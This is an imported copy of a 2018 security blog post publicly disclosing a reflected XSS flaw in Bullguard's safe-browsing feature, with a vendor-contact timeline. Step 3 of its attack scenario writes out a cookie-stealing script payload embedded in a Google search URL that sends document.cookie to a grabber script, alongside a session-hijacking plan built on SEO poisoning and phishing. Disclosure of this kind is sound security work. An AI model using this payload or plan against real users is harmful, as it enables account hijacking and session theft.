---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-09-14_hacking-your-own-antivirus-for-fun-and-profit-safe-browsing-gone-wrong.md
original_filename: 2018-09-14_hacking-your-own-antivirus-for-fun-and-profit-safe-browsing-gone-wrong.md
title: Hacking your own antivirus for fun and profit (Safe browsing gone wrong)
category: documents
detected_topics:
- xss
- command-injection
tags:
- imported
- documents
- xss
- command-injection
language: en
raw_sha256: 406375948aba53d62676af480e12fc8e725a6ced2bdf4c8b7b037090c10c3c0b
text_sha256: fc03c78bef3b77005adca6cb0ee6b7a0c1748ebc409509a6bc7091a8d9745187
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# Hacking your own antivirus for fun and profit (Safe browsing gone wrong)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-09-14_hacking-your-own-antivirus-for-fun-and-profit-safe-browsing-gone-wrong.md
- Source Type: markdown
- Detected Topics: xss, command-injection
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `406375948aba53d62676af480e12fc8e725a6ced2bdf4c8b7b037090c10c3c0b`
- Text SHA256: `fc03c78bef3b77005adca6cb0ee6b7a0c1748ebc409509a6bc7091a8d9745187`


## Content

---
title: "Hacking your own antivirus for fun and profit (Safe browsing gone wrong)"
url: "https://medium.com/@Mthirup/hacking-your-own-antivirus-for-fun-and-profit-safe-browsing-gone-wrong-365db9d1d3f7"
authors: ["Martin Thirup Christensen (@Mthirup)"]
programs: ["Bullguard"]
bugs: ["Reflected XSS"]
publication_date: "2018-09-14"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5701
scraped_via: "browseros"
---

# Hacking your own antivirus for fun and profit (Safe browsing gone wrong)

Hacking your own antivirus for fun and profit (Safe browsing gone wrong)
Martin Thirup Christensen
Follow
3 min read
·
Sep 14, 2018

24

Bullguard has a safe browsing feature to prevent their users from entering websites that contain malware, phishing or other malicious content. The idea in itself is great, but earlier this year I made discovery about, how this feature can be abused for malicious purposes. I have made multiple attempts at responsible disclosure since I discovered this vulnerability, but it still hasn’t been fixed, so after 4 months of attempted responsible disclosure, I have decided to make full disclosure of the vulnerability

When a user is browsing through google’s search results, they will see an approval or a warning based on their intelligence about the content being served on the domains. However, if a user is scrolling through google.com, it is possible to execute a javascript vector from the results.

As you can see in the picture below, document.domain refers to www.google.dk, which means the javascript is not sandboxed from google.dk

Press enter or click to view image in full size
Javascript executes without any sandboxing from google’s domain

In other words: The vulnerability allows an attacker to perform reflected Cross Site Scripting attacks on Google, Yahoo and Bing’s domains, if the victim uses bullguard. Imagine the following scenario:

1: An attacker inserts a malicious vector to perform session hijacking though a domain that is vulnerable to XSS in a GET parameter

2: The attacker manages to get enough clicks and abuse the SEO of the vulnerable domain to get his attack vector to show up as a result on google, yahoo and bing

3: The attacker sends a phishing link around that shows the malicious javascript in the results, which could look like this as an example https://www.google.dk/search?hl=da&ei=3L2bW5HJIYfFwQLKo5GYDA&q=site%3Avulndomain.com+inurl%3Aparam%3D<script>document.location%3D'http%3A%2F%2Flocalhost%2FXSS%2Fgrabber.php%3Fc%3D'+%2B+document.cookie<%2Fscript>

Get Martin Thirup Christensen’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

or alternatively: The vector gets so much SEO that it executes by itself from certain legitimate keywords!

4: The attacker has performed a succesful session hijacking attack against your google, microsoft or yahoo account!

XSS can be used for much more, but that’s another topic… Google it, if you’re curious.

Obviously, I decided to report the vulnerability to bullguard themselves, but unfortunately, the only available way of contacting them is though their customer service… Better than nothing, and worth a try though! I made a clear description about the issue and asked the customer service to pass the information through to their developers, or other relevant co-workers in their company.

After no patching had been done, I decided to give it a try again 3 months later, and it turned out that the development team had never responded to the customer service, who notified them about the issue. The customer service gave it another try, but nothing happened

Timeline:

16/05/2018: Vulnerability reported for the first time

02/07/2018 and 15/08/2018: Got in touch with bullguard to tell them that they were still vulnerable

14/09/2018: Public disclosure

Protip: Who says this vulnerability only affects bullguard? If your antivirus has a similar feature, try it out and remember to report the vulnerability responsibly to the vendor, if it’s vulnerable
